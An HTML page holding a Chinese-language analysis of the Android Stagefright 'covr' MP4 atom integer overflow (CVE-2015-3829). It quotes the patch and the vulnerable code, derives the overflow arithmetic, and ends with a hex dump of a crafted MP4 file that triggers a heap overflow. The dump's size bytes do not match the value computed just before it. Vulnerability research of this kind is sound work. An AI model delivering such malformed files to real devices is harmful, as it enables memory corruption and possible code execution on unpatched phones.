<!DOCTYPE html>
<html>
<head>
<title>CVE-2015-3829 Google Stagefright covr MP4 Atom Integer Overflow Remote Code Execution</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style type="text/css">
/* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
/* Author: Nicolas Hery - http://nicolashery.com */
/* Version: b13fe65ca28d2e568c6ed5d7f06581183df8f2ff */
/* Source: https://github.com/nicolahery/markdownpad-github */

/* RESET
=============================================================================*/

html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
  margin: 0;
  padding: 0;
  border: 0;
}

/* BODY
=============================================================================*/

body {
  font-family: Helvetica, arial, freesans, clean, sans-serif;
  font-size: 14px;
  line-height: 1.6;
  color: #333;
  background-color: #fff;
  padding: 20px;
  max-width: 960px;
  margin: 0 auto;
}

body>*:first-child {
  margin-top: 0 !important;
}

body>*:last-child {
  margin-bottom: 0 !important;
}

/* BLOCKS
=============================================================================*/

p, blockquote, ul, ol, dl, table, pre {
  margin: 15px 0;
}

/* HEADERS
=============================================================================*/

h1, h2, h3, h4, h5, h6 {
  margin: 20px 0 10px;
  padding: 0;
  font-weight: bold;
  -webkit-font-smoothing: antialiased;
}

h1 tt, h1 code, h2 tt, h2 code, h3 tt, h3 code, h4 tt, h4 code, h5 tt, h5 code, h6 tt, h6 code {
  font-size: inherit;
}

h1 {
  font-size: 28px;
  color: #000;
}

h2 {
  font-size: 24px;
  border-bottom: 1px solid #ccc;
  color: #000;
}

h3 {
  font-size: 18px;
}

h4 {
  font-size: 16px;
}

h5 {
  font-size: 14px;
}

h6 {
  color: #777;
  font-size: 14px;
}

body>h2:first-child, body>h1:first-child, body>h1:first-child+h2, body>h3:first-child, body>h4:first-child, body>h5:first-child, body>h6:first-child {
  margin-top: 0;
  padding-top: 0;
}

a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
  margin-top: 0;
  padding-top: 0;
}

h1+p, h2+p, h3+p, h4+p, h5+p, h6+p {
  margin-top: 10px;
}

/* LINKS
=============================================================================*/

a {
  color: #4183C4;
  text-decoration: none;
}

a:hover {
  text-decoration: underline;
}

/* LISTS
=============================================================================*/

ul, ol {
  padding-left: 30px;
}

ul li > :first-child, 
ol li > :first-child, 
ul li ul:first-of-type, 
ol li ol:first-of-type, 
ul li ol:first-of-type, 
ol li ul:first-of-type {
  margin-top: 0px;
}

ul ul, ul ol, ol ol, ol ul {
  margin-bottom: 0;
}

dl {
  padding: 0;
}

dl dt {
  font-size: 14px;
  font-weight: bold;
  font-style: italic;
  padding: 0;
  margin: 15px 0 5px;
}

dl dt:first-child {
  padding: 0;
}

dl dt>:first-child {
  margin-top: 0px;
}

dl dt>:last-child {
  margin-bottom: 0px;
}

dl dd {
  margin: 0 0 15px;
  padding: 0 15px;
}

dl dd>:first-child {
  margin-top: 0px;
}

dl dd>:last-child {
  margin-bottom: 0px;
}

/* CODE
=============================================================================*/

pre, code, tt {
  font-size: 12px;
  font-family: Consolas, "Liberation Mono", Courier, monospace;
}

code, tt {
  margin: 0 0px;
  padding: 0px 0px;
  white-space: nowrap;
  border: 1px solid #eaeaea;
  background-color: #f8f8f8;
  border-radius: 3px;
}

pre>code {
  margin: 0;
  padding: 0;
  white-space: pre;
  border: none;
  background: transparent;
}

pre {
  background-color: #f8f8f8;
  border: 1px solid #ccc;
  font-size: 13px;
  line-height: 19px;
  overflow: auto;
  padding: 6px 10px;
  border-radius: 3px;
}

pre code, pre tt {
  background-color: transparent;
  border: none;
}

kbd {
    -moz-border-bottom-colors: none;
    -moz-border-left-colors: none;
    -moz-border-right-colors: none;
    -moz-border-top-colors: none;
    background-color: #DDDDDD;
    background-image: linear-gradient(#F1F1F1, #DDDDDD);
    background-repeat: repeat-x;
    border-color: #DDDDDD #CCCCCC #CCCCCC #DDDDDD;
    border-image: none;
    border-radius: 2px 2px 2px 2px;
    border-style: solid;
    border-width: 1px;
    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
    line-height: 10px;
    padding: 1px 4px;
}

/* QUOTES
=============================================================================*/

blockquote {
  border-left: 4px solid #DDD;
  padding: 0 15px;
  color: #777;
}

blockquote>:first-child {
  margin-top: 0px;
}

blockquote>:last-child {
  margin-bottom: 0px;
}

/* HORIZONTAL RULES
=============================================================================*/

hr {
  clear: both;
  margin: 15px 0;
  height: 0px;
  overflow: hidden;
  border: none;
  background: transparent;
  border-bottom: 4px solid #ddd;
  padding: 0;
}

/* TABLES
=============================================================================*/

table th {
  font-weight: bold;
}

table th, table td {
  border: 1px solid #ccc;
  padding: 6px 13px;
}

table tr {
  border-top: 1px solid #ccc;
  background-color: #fff;
}

table tr:nth-child(2n) {
  background-color: #f8f8f8;
}

/* IMAGES
=============================================================================*/

img {
  max-width: 100%
}
</style>
<style type="text/css">
.highlight  { background: #ffffff; }
.highlight .c { color: #999988; font-style: italic } /* Comment */
.highlight .err { color: #a61717; background-color: #e3d2d2 } /* Error */
.highlight .k { font-weight: bold } /* Keyword */
.highlight .o { font-weight: bold } /* Operator */
.highlight .cm { color: #999988; font-style: italic } /* Comment.Multiline */
.highlight .cp { color: #999999; font-weight: bold } /* Comment.Preproc */
.highlight .c1 { color: #999988; font-style: italic } /* Comment.Single */
.highlight .cs { color: #999999; font-weight: bold; font-style: italic } /* Comment.Special */
.highlight .gd { color: #000000; background-color: #ffdddd } /* Generic.Deleted */
.highlight .gd .x { color: #000000; background-color: #ffaaaa } /* Generic.Deleted.Specific */
.highlight .ge { font-style: italic } /* Generic.Emph */
.highlight .gr { color: #aa0000 } /* Generic.Error */
.highlight .gh { color: #999999 } /* Generic.Heading */
.highlight .gi { color: #000000; background-color: #ddffdd } /* Generic.Inserted */
.highlight .gi .x { color: #000000; background-color: #aaffaa } /* Generic.Inserted.Specific */
.highlight .go { color: #888888 } /* Generic.Output */
.highlight .gp { color: #555555 } /* Generic.Prompt */
.highlight .gs { font-weight: bold } /* Generic.Strong */
.highlight .gu { color: #aaaaaa } /* Generic.Subheading */
.highlight .gt { color: #aa0000 } /* Generic.Traceback */
.highlight .kc { font-weight: bold } /* Keyword.Constant */
.highlight .kd { font-weight: bold } /* Keyword.Declaration */
.highlight .kp { font-weight: bold } /* Keyword.Pseudo */
.highlight .kr { font-weight: bold } /* Keyword.Reserved */
.highlight .kt { color: #445588; font-weight: bold } /* Keyword.Type */
.highlight .m { color: #009999 } /* Literal.Number */
.highlight .s { color: #d14 } /* Literal.String */
.highlight .na { color: #008080 } /* Name.Attribute */
.highlight .nb { color: #0086B3 } /* Name.Builtin */
.highlight .nc { color: #445588; font-weight: bold } /* Name.Class */
.highlight .no { color: #008080 } /* Name.Constant */
.highlight .ni { color: #800080 } /* Name.Entity */
.highlight .ne { color: #990000; font-weight: bold } /* Name.Exception */
.highlight .nf { color: #990000; font-weight: bold } /* Name.Function */
.highlight .nn { color: #555555 } /* Name.Namespace */
.highlight .nt { color: #000080 } /* Name.Tag */
.highlight .nv { color: #008080 } /* Name.Variable */
.highlight .ow { font-weight: bold } /* Operator.Word */
.highlight .w { color: #bbbbbb } /* Text.Whitespace */
.highlight .mf { color: #009999 } /* Literal.Number.Float */
.highlight .mh { color: #009999 } /* Literal.Number.Hex */
.highlight .mi { color: #009999 } /* Literal.Number.Integer */
.highlight .mo { color: #009999 } /* Literal.Number.Oct */
.highlight .sb { color: #d14 } /* Literal.String.Backtick */
.highlight .sc { color: #d14 } /* Literal.String.Char */
.highlight .sd { color: #d14 } /* Literal.String.Doc */
.highlight .s2 { color: #d14 } /* Literal.String.Double */
.highlight .se { color: #d14 } /* Literal.String.Escape */
.highlight .sh { color: #d14 } /* Literal.String.Heredoc */
.highlight .si { color: #d14 } /* Literal.String.Interpol */
.highlight .sx { color: #d14 } /* Literal.String.Other */
.highlight .sr { color: #009926 } /* Literal.String.Regex */
.highlight .s1 { color: #d14 } /* Literal.String.Single */
.highlight .ss { color: #990073 } /* Literal.String.Symbol */
.highlight .bp { color: #999999 } /* Name.Builtin.Pseudo */
.highlight .vc { color: #008080 } /* Name.Variable.Class */
.highlight .vg { color: #008080 } /* Name.Variable.Global */
.highlight .vi { color: #008080 } /* Name.Variable.Instance */
.highlight .il { color: #009999 } /* Literal.Number.Integer.Long */
.pl-c {
    color: #969896;
}

.pl-c1,.pl-mdh,.pl-mm,.pl-mp,.pl-mr,.pl-s1 .pl-v,.pl-s3,.pl-sc,.pl-sv {
    color: #0086b3;
}

.pl-e,.pl-en {
    color: #795da3;
}

.pl-s1 .pl-s2,.pl-smi,.pl-smp,.pl-stj,.pl-vo,.pl-vpf {
    color: #333;
}

.pl-ent {
    color: #63a35c;
}

.pl-k,.pl-s,.pl-st {
    color: #a71d5d;
}

.pl-pds,.pl-s1,.pl-s1 .pl-pse .pl-s2,.pl-sr,.pl-sr .pl-cce,.pl-sr .pl-sra,.pl-sr .pl-sre,.pl-src,.pl-v {
    color: #df5000;
}

.pl-id {
    color: #b52a1d;
}

.pl-ii {
    background-color: #b52a1d;
    color: #f8f8f8;
}

.pl-sr .pl-cce {
    color: #63a35c;
    font-weight: bold;
}

.pl-ml {
    color: #693a17;
}

.pl-mh,.pl-mh .pl-en,.pl-ms {
    color: #1d3e81;
    font-weight: bold;
}

.pl-mq {
    color: #008080;
}

.pl-mi {
    color: #333;
    font-style: italic;
}

.pl-mb {
    color: #333;
    font-weight: bold;
}

.pl-md,.pl-mdhf {
    background-color: #ffecec;
    color: #bd2c00;
}

.pl-mdht,.pl-mi1 {
    background-color: #eaffea;
    color: #55a532;
}

.pl-mdr {
    color: #795da3;
    font-weight: bold;
}

.pl-mo {
    color: #1d3e81;
}
.task-list {
padding-left:10px;
margin-bottom:0;
}

.task-list li {
    margin-left: 20px;
}

.task-list-item {
list-style-type:none;
padding-left:10px;
}

.task-list-item label {
font-weight:400;
}

.task-list-item.enabled label {
cursor:pointer;
}

.task-list-item+.task-list-item {
margin-top:3px;
}

.task-list-item-checkbox {
display:inline-block;
margin-left:-20px;
margin-right:3px;
vertical-align:1px;
}
</style>
</head>
<body>
<h1 id="cve-2015-3829-google-stagefright-covr-mp4-atom-integer-overflow-remote-code-execution">CVE-2015-3829 Google Stagefright covr MP4 Atom Integer Overflow Remote Code Execution</h1>
<p><strong>Author:wnagzihxa1n<br>E-Mail:wnagzihxa1n@gmail.com</strong></p>
<p>谷歌公告</p>
<ul>
<li><a href="https://source.android.com/security/bulletin/2015-08-01">https://source.android.com/security/bulletin/2015-08-01</a></li></ul>
<p>补丁</p>
<ul>
<li><a href="https://android.googlesource.com/platform/frameworks/av/+/2674a7218eaa3c87f2ee26d26da5b9170e10f859%5E%21/#F0">https://android.googlesource.com/platform/frameworks/av/+/2674a7218eaa3c87f2ee26d26da5b9170e10f859%5E%21/#F0</a></li></ul>
<p>当<code>chunk_data_size</code>的值设置为<code>SIZE_MAX</code>时，就会因为整数溢出导致漏洞</p>
<pre><code>Prevent integer overflow when processing covr MPEG4 atoms

If the &#39;chunk_data_size&#39; value is SIZE_MAX, an integer overflow will occur
and cause an undersized buffer to be allocated. The following processing
then overfills the resulting memory and creates a potentially exploitable
condition. Ensure that integer overflow does not occur.
</code></pre><p>根据漏洞补丁找到对应的代码段所处的函数，如下是存在漏洞的代码段</p>
<pre><code>case FOURCC(&#39;c&#39;, &#39;o&#39;, &#39;v&#39;, &#39;r&#39;):
{
    *offset += chunk_size;

    if (mFileMetaData != NULL) {
        ALOGV(&quot;chunk_data_size = %lld and data_offset = %lld&quot;,
                chunk_data_size, data_offset);
        sp&lt;ABuffer&gt; buffer = new ABuffer(chunk_data_size + 1);
        if (mDataSource-&gt;readAt(
            data_offset, buffer-&gt;data(), chunk_data_size) != (ssize_t)chunk_data_size) {
            return ERROR_IO;
        }
        const int kSkipBytesOfDataBox = 16;
        mFileMetaData-&gt;setData(
            kKeyAlbumArt, MetaData::TYPE_NONE,
            buffer-&gt;data() + kSkipBytesOfDataBox, chunk_data_size - kSkipBytesOfDataBox);
    }

    break;
}
</code></pre><p>如下是修复后的</p>
<pre><code>@@ -1932,6 +1932,10 @@
             if (mFileMetaData != NULL) {
                 ALOGV(&quot;chunk_data_size = %lld and data_offset = %lld&quot;,
                         chunk_data_size, data_offset);
+
+                if (chunk_data_size &gt;= SIZE_MAX - 1) {
+                    return ERROR_MALFORMED;
+                }
                 sp&lt;ABuffer&gt; buffer = new ABuffer(chunk_data_size + 1);
                 if (mDataSource-&gt;readAt(
                     data_offset, buffer-&gt;data(), chunk_data_size) != (ssize_t)chunk_data_size) {
</code></pre><p>我们顺着流程解析一下，因为修复的代码着重判断了<code>chunk_data_size</code>，所以很有可能是直接通过指针读取了内存中的某些字段当做<code>chunk_data_size</code>的值了</p>
<p>往上翻，发现这个代码段处在<code>MPEG4Extractor::parseChunk()</code>函数里，在函数开始处对<code>chunk_data_size</code>进行了赋值操作，果然就像我们猜想的，将文件映射到内存中，加上某个偏移取出一个字段计算下就赋值</p>
<pre><code>off64_t chunk_data_size = *offset + chunk_size - data_offset;
</code></pre><p>接下来我们来确定<code>offset</code>，<code>chunk_size</code>和<code>data_offset</code>这三个值是如何计算的</p>
<p>从代码中可以很明显的看出<code>offset</code>是指某个偏移量，我们搜索其调用，发现有一个<code>MPEG4Extractor::readMetaData()</code>函数，这个函数调用<code>MPEG4Extractor::parseChunk()</code>，并将<code>offset</code>参数传入，我们分析<code>MPEG4Extractor::readMetaData()</code>函数，发现<code>offset</code>其实是传入用于辅助计算的</p>
<pre><code>off64_t offset = 0;
status_t err;
while (true) {
    off64_t orig_offset = offset;
    err = parseChunk(&amp;offset, 0);
</code></pre><p>然后由<code>MPEG4Extractor::parseChunk()</code>对<code>hdr</code>进行赋值，这个存储的是Chunk的头部，一共是两个4字节的数据</p>
<pre><code>uint32_t hdr[2];
if (mDataSource-&gt;readAt(*offset, hdr, 8) &lt; 8) {
    return ERROR_IO;
}
</code></pre><p><code>readAt()</code>是一个封装了的用于读取内存的函数，那么可以看到核心就是<code>memcpy()</code>函数</p>
<pre><code>ssize_t MPEG4DataSource::readAt(off64_t offset, void *data, size_t size) {
    Mutex::Autolock autoLock(mLock);

    if (offset &gt;= mCachedOffset
            &amp;&amp; offset + size &lt;= mCachedOffset + mCachedSize) {
        memcpy(data, &amp;mCache[offset - mCachedOffset], size);
        return size;
    }

    return mSource-&gt;readAt(offset, data, size);
}
</code></pre><p>在获取了<code>hdr</code>数据后进行读取</p>
<pre><code>uint64_t chunk_size = ntohl(hdr[0]);
uint32_t chunk_type = ntohl(hdr[1]);
off64_t data_offset = *offset + 8;
</code></pre><p>那么现在流程就出来了，而我们也可以再次进行下面这句代码的分析，<code>*offset</code>为0，<code>chunk_size</code>为读取后确定，这个可以由我们手动构造样本控制，<code>data_offset</code>为8</p>
<pre><code>off64_t chunk_data_size = *offset + chunk_size - data_offset;
</code></pre><p>再结合我们的漏洞代码段，假如我们的<code>chunk_data_size</code>为<code>0xFFFFFFFF</code>，那么加一后就会发生整数溢出，最后进行堆空间申请的时候就会分配0，所以再次调用<code>readAt()</code>进行写的时候，就会发生堆溢出</p>
<pre><code> sp&lt;ABuffer&gt; buffer = new ABuffer(chunk_data_size + 1);
if (mDataSource-&gt;readAt(
    data_offset, buffer-&gt;data(), chunk_data_size) != (ssize_t)chunk_data_size) {
    return ERROR_IO;
}
</code></pre><p>我们来计算如何让<code>chunk_data_size</code>在一系列的变换后变成<code>0xFFFFFFFF</code></p>
<pre><code>chunk_data_size = *offset + chunk_size - data_offset
===&gt; 0xFFFFFFFF = 0 + chunk_size - 8
===&gt; chunk_size = 0xFFFFFFFF + 8
</code></pre><p>因为文件格式中定义了，如果<code>chunk_zise</code>为1，可以使用第8位开始的8字节作为长度，这一点从定义中也可以看出来<code>off64_t data_offset</code></p>
<p>所以我们可以构造<code>chunk_size</code>为1，然后把长度放到后面</p>
<pre><code>00 00 00 01 &#39;c&#39; &#39;o&#39; &#39;v&#39; &#39;r&#39;
</code></pre><p>因为此时Chunk头的长度变了，多了8字节，所以我们之前就需要加上8</p>
<pre><code>chunk_size = 0xFFFFFFFF + 8 + 8
===&gt; chunk_size = 0x10000000F
</code></pre><p>再次构造Chunk头</p>
<pre><code>00 00 00 01 &#39;c&#39; &#39;o&#39; &#39;v&#39; &#39;r&#39; 00 00 00 01 00 00 00 0F
</code></pre><p>然后就可以构造一个MP4文件了</p>
<pre><code>00000000  00 00 00 18 66 74 79 70  6D 70 34 32 00 00 00 00  ....ftypmp42....
00000010  6D 70 34 32 69 73 6F 6D  00 00 00 01 63 6F 76 72  mp42isom....covr
00000020  00 00 01 00 00 00 00 0F  41 41 41 41 41 41 41 41  ........AAAAAAAA
00000030  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
</code></pre><h2 id="reference">Reference</h2>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2015-3829">https://nvd.nist.gov/vuln/detail/CVE-2015-3829</a></li><li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3829">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3829</a></li><li><a href="http://colbert337.github.io/2015/08/14/stagefright-covr/">http://colbert337.github.io/2015/08/14/stagefright-covr/</a></li><li><a href="https://blog.zimperium.com/stagefright-vulnerability-details-stagefright-detector-tool-released/">https://blog.zimperium.com/stagefright-vulnerability-details-stagefright-detector-tool-released/</a></li><li><a href="http://wooyun.jozxing.cc/static/drops/papers-7558.html">http://wooyun.jozxing.cc/static/drops/papers-7558.html</a></li><li><a href="http://wooyun.jozxing.cc/static/drops/mobile-7491.html">http://wooyun.jozxing.cc/static/drops/mobile-7491.html</a></li></ul>

</body>
</html>
<!-- This document was created with MarkdownPad, the Markdown editor for Windows (http://markdownpad.com) -->
